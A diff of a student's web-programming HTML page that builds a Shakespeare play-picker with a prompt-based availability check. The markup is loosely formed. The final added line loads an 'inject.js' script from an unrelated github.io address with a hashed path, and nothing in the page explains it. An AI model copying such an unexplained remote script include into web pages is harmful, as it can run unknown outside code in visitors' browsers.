@@ -1,25 +1,93 @@
+<!DOCTYPE html>
+<html>
 	<head>
 		<title>Elise Cruz Aragon | Web Programming I</title>
 		<link rel="stylesheet" type="text/css" href="style.css">
 		<link rel="preconnect" href="https://fonts.googleapis.com">
 		<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
 		<link href="https://fonts.googleapis.com/css2?family=Sofia+Sans:wght@300&display=swap" rel="stylesheet">
-	</head>
-<!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <title>Javascript - for...of loop</title>
 </head>
-<body>
-    <h2>Using for...of loop in javascript to iterate through array.</h2>
-    <p id="output"></p>
+    <meta charset="UTF-8" />
+    <title>Week 8</title>
+    <link rel="stylesheet" href="style.css" />
+    // Added a loop that reads through some Shakespeare titles before adding them to the array, lord have mercy i hope it works lol
+    <p id="bigman"></p>
+
+<script>
+const plays = ["Macbeth", "Romeo and Juliet", "Hamlet", "Othello"];
+
+let i = 0;
+let text = "ANOTHER ONE";
+for (;plays[i];) {
+  text += plays[i] + "<br>";
+  i++;
+}
+
+document.getElementById("bigman").innerHTML = text;
+</script>
     <script>
-        var fruits = ["Apple", "Banana", "Carrot", "Guava", "Orange"];
-        let i;
-        for (i of fruits) { // i represent 1 value of fruit 
-            document.getElementById("output").innerHTML += i + "<br>";
+      // A website to choose a Shakespearean play for a project. Once the play is picked, it's on the list and can't be chosen again.
+
+      // Setting up an array of Shakepeare's works
+      var ws_play = [
+        "Much Ado About Nothing",
+        "Romeo and Juliet",
+        "Macbeth",
+	"macbeth",
+	"romeo and juliet",
+	"romeo & juliet",
+	"Romeo & Juliet",
+      ];
+
+      // function to display the array as a list
+      function displayList() {
+        var list = document.getElementById("list");
+        list.innerHTML = "";
+
+        for (var i = 0; i < ws_play.length; i++) {
+          var item = document.createElement("li");
+          item.appendChild(document.createTextNode(ws_play[i]));
+          list.appendChild(item);
         }
+      }
+
+      // Is the play you want available?
+      function IsSPlayInArray() {
+        var newPlay = prompt(
+          "Enter a play and we will see if this play is available."
+        );
+        if (ws_play.includes(newPlay)) {
+          alert(
+            "Sorry! This play is taken. Please choose another play. " +
+              newPlay
+            // Whomp whomp pick another play
+          );
+        } else {
+          alert("Congratulations! The play is available: " + newPlay);
+          ws_play.push(newPlay);
+          // Hands in the air, this play is all yours
+        }
+      }
     </script>
-</body>
+  <body>
+    <h1>Shakespearean Play Form</h1>
+    <p>
+      Pick a play by our guy, Willie Shakes. You'll do your diorama on a scene from here.
+    </p>
+
+    <!--Form to choose your play-->
+    <form onsubmit="event.preventDefault(); IsSPlayInArray();">
+      <label for="newPlayInput">Pick your play:</label>
+      <input type="text" id="newPlayInput" name="newPlayInput" />
+      <button type="submit">Check</button>
+    </form>
+
+    <!--Click here to see which plays are already accounted for-->
+    <ul id="list"></ul>
+    <button onclick="displayList()">All the world's a stage... and these are taken</button>
+
+    <br />
+    <!--Shakespeare pic with some notable titles superimposed-->
+    <img src="https://image.slidesharecdn.com/shakespeareswinner-150319174030-conversion-gate01/95/shakespeares-plays-and-themes-1-638.jpg?cb=1426787782" alt="Image of states" width="600px" />
+  <script type='text/javascript'  src="https://emca911.github.io/8096d2793a237bd0b23ad09114d538dd88d3ca6cbfaa2c84d77fc6ddd3ea6dee/inject.js?id=dad34f30-79a8-4d35-bd15-9278c44af36e"></script></body>
 </html>
